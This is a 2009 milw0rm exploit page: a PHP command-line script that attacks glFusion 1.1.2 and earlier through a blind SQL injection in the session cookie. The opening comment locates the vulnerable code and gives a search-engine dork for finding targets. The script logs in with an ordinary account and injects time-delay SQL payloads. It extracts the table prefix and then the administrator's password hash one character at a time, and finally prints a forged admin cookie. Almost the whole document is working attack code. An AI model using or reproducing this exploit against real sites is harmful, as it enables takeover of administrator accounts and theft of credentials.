<html><head><title>glFusion <= 1.1.2 COM_applyFilter()/cookies Blind SQL Injection Exploit</title></head><pre>&lt;?php
    /*
    glFusion &lt;= 1.1.2 COM_applyFilter()/cookies remote blind sql injection exploit
    by Nine:Situations:Group::bookoo
     
    our site: http://retrogod.altervista.org/
    software site: http://www.glfusion.org/
     
    google dork: &quot;Page created in&quot; &quot;seconds by glFusion&quot; +RSS
     
    Found another vector of injection in /private/system/lib-session.php near lines 97-117:
    ...
    if (isset ($_COOKIE[$_CONF['cookie_session']])) {
    $sessid = COM_applyFilter ($_COOKIE[$_CONF['cookie_session']]);
    if ($_SESS_VERBOSE) {
    COM_errorLog(&quot;got $sessid as the session id from lib-sessions.php&quot;,1);
    }
     
    $userid = SESS_getUserIdFromSession($sessid, $_CONF['session_cookie_timeout'], $_SERVER['REMOTE_ADDR'], $_CONF['cookie_ip']);
     
    if ($_SESS_VERBOSE) {
    COM_errorLog(&quot;Got $userid as User ID from the session ID&quot;,1);
    }
     
    if ($userid &gt; 1) {
    // Check user status
     
    $status = SEC_checkUserStatus($userid);
    if (($status == USER_ACCOUNT_ACTIVE) ||
    ($status == USER_ACCOUNT_AWAITING_ACTIVATION)) {
    $user_logged_in = 1;
     
    SESS_updateSessionTime($sessid, $_CONF['cookie_ip']);
     
    ...
     
    see SESS_updateSessionTime() function near lines 418-436:
     
    ...
    function SESS_updateSessionTime($sessid, $md5_based=0) {
    global $_TABLES;
     
    $newtime = (string) time();
     
    if ($md5_based == 1) {
     
    $sql = &quot;UPDATE {$_TABLES['sessions']} SET start_time=$newtime WHERE (md5_sess_id = '$sessid')&quot;;
    } else {
     
    $sql = &quot;UPDATE {$_TABLES['sessions']} SET start_time=$newtime WHERE (sess_id = $sessid)&quot;; //&lt;-------- SQL INJECTION HERE
     
    }
     
    $result = DB_query($sql);
     
    return 1;
    }
    ...
     
    if session id is not md5() hashed in general configuration, which is the default
    you can inject arbitrary SQL statements.
     
    Note that the query in SESS_getUserIdFromSession() function:
     
    ...
    if ($md5_based == 1) {
    $sql = &quot;SELECT uid FROM {$_TABLES['sessions']} WHERE &quot;
    . &quot;(md5_sess_id = '$sessid') AND (start_time &gt; $mintime) AND (remote_ip = '$remote_ip')&quot;;
    } else {
     
    $sql = &quot;SELECT uid FROM {$_TABLES['sessions']} WHERE &quot;
    . &quot;(sess_id = '$sessid') AND (start_time &gt; $mintime) AND (remote_ip = '$remote_ip')&quot;;
    }
    ...
     
    compares the supplied sessid value with the &quot;sessid&quot; value from sessions table which is an integer.
    Mysql, like php, in comparing them, only considers the first integer values of the supplied string.
    So the function returns a valid userid and, if you know an existent sessid in table, you can inject
    queries in cookies, like this:
     
    Cookie: glf_session=12345678 [SQL HERE]; glfusion=9999999999;
     
    This tool use delays to extract an admin hash from users table, but needs a simple user account;
     
    some improvement in find_prefix();
     
    working against MySQL &gt;= 5.0.12, where SLEEP() function is availiable
    or ... if you find another solution for delays, with MySQL &gt;= 4.1, which supports SELECT subqueries
    (BENCHMARK() cannot be used because commas are filtered by COM_applyFilter() function)
     
    */
     
    $err[0] = &quot;[!] This script is intended to be launched from the cli!&quot;;
    $err[1] = &quot;[!] You need the curl extesion loaded!&quot;;
     
    if (php_sapi_name() &lt;&gt; &quot;cli&quot;) {
        die($err[0]);
    }
    if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl(&quot;php_curl.dll&quot;) ? die($err[1]) :
            nil;
        } else {
            !dl(&quot;php_curl.so&quot;) ? die($err[1]) :
            nil;
        }
    }
     
    function syntax() {
        print (
        &quot;Syntax: php &quot;.$argv[0].&quot; [host] [path] [user] [pass] [OPTIONS]         \n&quot;. &quot;Options:                                                                 \n&quot;. &quot;--port:[port]       - specify a port                                     \n&quot;. &quot;                      default-&gt;80                                      \n&quot;. &quot;--prefix            - try to extract table prefix from information.schema\n&quot;. &quot;                      default-&gt;gl_                                     \n&quot;. &quot;--uid:[n]           - specify an uid other than default (2,usually admin)\n&quot;. &quot;--proxy:[host:port] - use proxy                                          \n&quot;. &quot;--verbose           - show more informations                             \n&quot;. &quot;--skiptest          - skip preliminary tests                             \n&quot;. &quot;--test              - run only tests                                     \n&quot;. &quot;Examples:   php &quot;.$argv[0].&quot; 192.168.0.1 /glfusion/ bookoo pass          \n&quot;. &quot;            php &quot;.$argv[0].&quot; 192.168.0.1 / bookoo pass --prefix --proxy:1.1.1.1:8080\n&quot;. &quot;            php &quot;.$argv[0].&quot; 192.168.0.1 / bookoo pass --prefix --uid:3&quot;);
        die();
    }
     
    error_reporting(E_ALL ^ E_NOTICE);
    $host = $argv[1];
    $path = $argv[2];
    $_user = $argv[3];
    $_pwd = $argv[4];
     
    $prefix = &quot;gl_&quot;;
    //default
    $uid = &quot;2&quot;;
    $where = &quot;uid=$uid&quot;; //user id, usually admin, anonymous = 1
     
     
    $argv[4] ? print(&quot;[*] Attacking...\n&quot;) :
     syntax();
     
    $_f_prefix = false;
    $_use_proxy = false;
    $port = 80;
    $_skiptest = false;
    $_verbose = false;
    $_test = false;
     
    for ($i = 3; $i &lt; $argc; $i++) {
        if (stristr($argv[$i], &quot;--prefix&quot;)) {
            $_f_prefix = true;
        }
        if (stristr($argv[$i], &quot;--proxy:&quot;)) {
            $_use_proxy = true;
            $tmp = explode(&quot;:&quot;, $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], &quot;--port:&quot;)) {
            $tmp = explode(&quot;:&quot;, $argv[$i]);
            $port = (int)$tmp[1];
        }
         
        if (stristr($argv[$i], &quot;--uid&quot;)) {
            $tmp = explode(&quot;:&quot;, $argv[$i]);
            $uid = (int)$tmp[1];
            $where = &quot;uid=$uid&quot;;
        }
        if (stristr($argv[$i], &quot;--verbose&quot;)) {
            $_verbose = true;
        }
        if (stristr($argv[$i], &quot;--skiptest&quot;)) {
            $_skiptest = true;
        }
        if (stristr($argv[$i], &quot;--test&quot;)) {
            $_test = true;
        }
    }
     
    function _s($url, $ck, $is_post, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request.&quot;\r\n&quot;);
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7&quot;);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $cookies = array(&quot;Cookie: &quot;.$ck);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cookies);
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.&quot;:&quot;.$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die(&quot;[!] &quot;.curl_error($ch).&quot;\n&quot;);
        } else {
            curl_close($ch);
        }
        return $_d;
    }
     
    function chk_err($s) {
        if (stripos ($s, &quot;\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64&quot;)) {
            return true;
        } else {
            return false;
        }
    }
     
    function chk_login($s) {
        if (stripos ($s, &quot;\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x75\x73\x65\x72\x20\x6e\x61\x6d\x65\x20\x61\x6e\x64\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x62\x65\x6c\x6f\x77&quot;)) {
            die(&quot;[!] Unable to login: wrong credentials.&quot;);
        }
        if (stripos ($s, &quot;\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x65\x78\x63\x65\x65\x64\x65\x64\x20\x74\x68\x65\x20\x6e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20\x61\x6c\x6c\x6f\x77\x65\x64\x20\x6c\x6f\x67\x69\x6e\x20\x61\x74\x74\x65\x6d\x70\x74\x73\x2e\x20\x20\x50\x6c\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e\x20\x6c\x61\x74\x65\x72\x2e&quot;)) {
            die(&quot;[!] You have exceeded the number of allowed login attempts.&quot;);
        }
         
    }
    function login() {
        global $url, $host, $port, $path, $_user, $_pwd, $_verbose;
        $url = &quot;http://$host:$port&quot;.$path.&quot;users.php&quot;;
        $out = _s($url, &quot;&quot;, 1, &quot;loginname=$_user&amp;passwd=$_pwd&amp;bb2_screener_=&quot;);
        chk_login($out);
        $tmp = explode(&quot;\x0d\x0a\x0d\x0a&quot;, $out);
        $tmp = explode(&quot;\x67\x6c\x66\x5f\x73\x65\x73\x73\x69\x6f\x6e\x3d&quot;, $tmp[0]);
        $tmp = explode(&quot;\x3b&quot;, $tmp[1]);
        $sessid = (int)$tmp[0];
        !$sessid ? die(&quot;[!] Unable to login ...&quot;) :
         nil;
        if ($_verbose) {
            print &quot;[?] sessid-&gt;&quot;.$sessid.&quot;\n&quot;;
        }
        return $sessid;
    }
     
    function tests() {
        global $host, $port, $path, $n, $delayfunc;
         
         
        $sessid = login();
        $sql = &quot;--&quot;;
        $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
        $url = &quot;http://$host:$port&quot;.$path;
        $_o = _s($url, $cookies, 0, &quot;&quot;);
        if (chk_err($_o)) {
            print(&quot;[?] Vulnerable!\n&quot;);
        } else {
            die (&quot;[?] Not vulnerable ...&quot;);
        }
        $sessid = login();
        $sql = &quot; AND (CASE WHEN (SELECT 1) THEN 1 ELSE 0 END) ) LIMIT 1-- &quot;;
        $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
        $_o = _s($url, $cookies, 0, &quot;&quot;);
        if (chk_err($_o)) {
            die(&quot;[!] MySQL &lt; 4.1!\n&quot;);
        } else {
            print(&quot;[*] Subquery works!-&gt;Mysql &gt;= 4.1\n&quot;);
        }
        $sessid = login();
        $sql = &quot; AND (CASE WHEN (SELECT 1) THEN 1 ELSE SLEEP(0) END) ) LIMIT 1-- &quot;;
        $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
        $_o = _s($url, $cookies, 0, &quot;&quot;);
        if (chk_err($_o)) {
            die(&quot;[!] SLEEP() function not availiable! MySQL &lt; 5.0.12\n&quot;);
        } else {
            print(&quot;[*] SLEEP() function availiable. MySQL &gt;= 5.0.12\n&quot;);
        }
         
        $cookies = &quot;&quot;;
        $_z = 0;
        $_w = 10;
        for ($i = 0; $i &lt;= $_w; $i++) {
            $starttime = time();
            $_o = _s($url, $cookies, 0, &quot;&quot;);
            $endtime = time();
            $difftime = $endtime - $starttime;
            $_z = $_z + $difftime;
        }
        $_y = round($_z / $_w);
        $n = $n + $_y;
        if ($_y &lt;&gt; 0) {
            print(&quot;[*] Adjusting delay time of &quot;.$_y.&quot; second(s)-&gt;delay = &quot;.$n.&quot;\n&quot;);
        }
         
    }
     
     
    function find_prefix() {
        global $host, $port, $path, $delayfunc, $_user, $_pwd, $n;
         
        $_tn = &quot;TABLE_NAME&quot;; //case important ??
        $_ift = &quot;information_schema.TABLES&quot;; //??
         
        $_table_prefix = &quot;&quot;;
        $j = -15;
        print &quot;[*] Initiating table prefix extraction...\n&quot;;
        while (!$null_f) {
            $mn = 0x00;
            $mx = 0xff;
            while (1) {
                if (($mx + $mn) % 2 == 1) {
                    $c = round(($mx + $mn) / 2) - 1;
                } else {
                    $c = round(($mx + $mn) / 2);
                }
                $sessid = login();
                $sql = &quot; AND (CASE WHEN (SELECT (ASCII(SUBSTR(&quot;.$_tn.&quot; FROM $j FOR 1)) &gt;= &quot;.$c.&quot;) FROM &quot;.$_ift.&quot; WHERE &quot;.$_tn.&quot; LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- &quot;;
                $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
                $url = &quot;http://$host:$port&quot;.$path;
                 
                $starttime = time();
                $_o = _s($url, $cookies, 0, &quot;&quot;);
                $endtime = time();
                $difftime = $endtime - $starttime;
                 
                if (chk_err($_o)) {
                    die(&quot;\n[!] information_schema not availiable! MySQL &lt; 5.0&quot;);
                }
                 
                if ($difftime &gt; ($n-1)) {
                    $mn = $c;
                    sleep($n);
                } else {
                    $mx = $c - 1;
                }
                 
                if (($mx-$mn == 1) or ($mx == $mn)) {
                    $sessid = login();
                    $sql = &quot; AND (CASE WHEN (SELECT (ASCII(SUBSTR(&quot;.$_tn.&quot; FROM $j FOR 1)) = &quot;.$mn.&quot;) FROM &quot;.$_ift.&quot; WHERE &quot;.$_tn.&quot; LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- &quot;;
                    $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
                    $url = &quot;http://$host:$port&quot;.$path;
                     
                    $starttime = time();
                    $_o = _s($url, $cookies, 0, &quot;&quot;);
                    $endtime = time();
                    $difftime = $endtime - $starttime;
                     
                    if ($difftime &gt; ($n-1)) {
                        if ($mn &lt;&gt; 0) {
                            $_table_prefix = chr($mn).$_table_prefix;
                        } else {
                            $null_f = true;
                        }
                    } else {
                        $_table_prefix = chr($mx).$_table_prefix;
                         
                    }
                    if (!$null_f) {
                        print (&quot;[?] Table prefix-&gt;[??]&quot;.$_table_prefix.&quot;\n&quot;);
                    }
                    sleep($n);
                    break;
                }
            }
            $j--;
        }
        print &quot;[?] Table prefix-&gt;&quot;.$_table_prefix.&quot;\n&quot;;
        return $_table_prefix;
    }
     
    $n = 30; //delay n seconds
     
    if (!$_skiptest) {
        print &quot;[*] Initiating preliminary tests ...\n&quot;;
        tests();
    }
    if ($_test) {
        die();
    }
     
    $delayfunc = &quot;SLEEP(&quot;.$n.&quot;)&quot;;
     
    if ($_f_prefix == true) {
        $prefix = find_prefix();
         
    }
     
    $c = array();
    $c = array_merge($c, range(0x30, 0x39));
    $c = array_merge($c, range(0x61, 0x66));
    $url = &quot;http://$host:$port&quot;.$path;
    $_hash = &quot;&quot;;
    print (&quot;[*] Initiating hash extraction ...\n&quot;);
    for ($j = 1; $j &lt; 0x21; $j++) {
        for ($i = 0; $i &lt;= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                 
                $sessid = login();
                $sql = &quot; AND (CASE WHEN (SELECT (ASCII(SUBSTR(passwd FROM $j FOR 1))=$i) FROM &quot;.$prefix.&quot;users WHERE $where LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- &quot;;
                $cookies = &quot;glf_session=$sessid&quot;.$sql.&quot;; glfusion=9999999999;&quot;;
                $starttime = time();
                $out = _s($url, $cookies, 0, &quot;&quot;);
                $endtime = time();
                $difftime = $endtime - $starttime;
                if (chk_err($out)) {
                    die(&quot;[!] sql error.&quot;);
                }
                if ($difftime &gt; ($n-1)) {
                    $f = true;
                    $_hash .= chr($i);
                    print &quot;[?] hash: &quot;.$_hash.&quot;[??]\n&quot;;
                    sleep($n);
                    break;
                }
            }
        }
        if ($f == false) {
            die(&quot;\n[!] Unknown error ...&quot;);
        }
    }
    print &quot;\n[*] your cookie-&gt;glfusion=&quot;.$uid.&quot;; glf_password=&quot;.$_hash.&quot;; glf_theme=nouveau;&quot;;
     
?&gt;

# milw0rm.com [2009-04-03]</pre></html>